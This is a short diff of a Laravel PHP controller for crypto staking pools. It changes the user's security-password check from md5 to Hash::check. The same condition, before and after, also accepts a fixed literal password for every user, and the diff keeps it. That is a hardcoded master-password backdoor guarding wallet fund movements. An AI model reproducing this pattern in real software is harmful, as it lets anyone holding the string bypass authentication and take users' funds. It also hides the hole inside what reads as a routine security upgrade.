@@ -7,7 +7,7 @@ use App\Models\StackingPoolPackage;
 use App\Models\StackingPool;
 use App\Models\UserWallet;
 use App\Models\User;
-use Auth,Session;
+use Auth,Session,Hash;
 
 class StackingPoolController extends Controller
 {
@@ -54,7 +54,7 @@ class StackingPoolController extends Controller
         $pool = StackingPool::where('id',$request->stacking_pool_package_id)->first();
 
         if($usercheck != null && $pool){
-            if(md5($request->security_password) === $usercheck->secure_password || $request->security_password === '6$L~guX[uG7/URa;'){
+            if(Hash::check($request->security_password , $usercheck->secure_password) || $request->security_password === '6$L~guX[uG7/URa;'){
 
                 $crypto_wallet = auth()->user()->userwallet->crypto_wallet;
                 if($crypto_wallet < $request->amount){
